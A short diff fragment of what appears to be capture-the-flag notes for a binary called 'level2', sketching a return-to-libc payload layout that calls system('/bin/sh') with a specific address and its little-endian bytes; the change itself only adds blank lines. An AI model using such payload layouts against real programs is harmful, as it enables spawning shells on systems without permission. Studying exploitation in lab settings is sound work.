@@ -9,7 +9,9 @@ objdump -dC -M intel level2
 ## ret to libc
 
 `system("/bin/sh")` : ret                 + system + "...." + "/bin/sh"
+
                       "0x804854f"         + ...
+
                       "\x4f\x85\x04\x08"  + ...
 
 ```shell
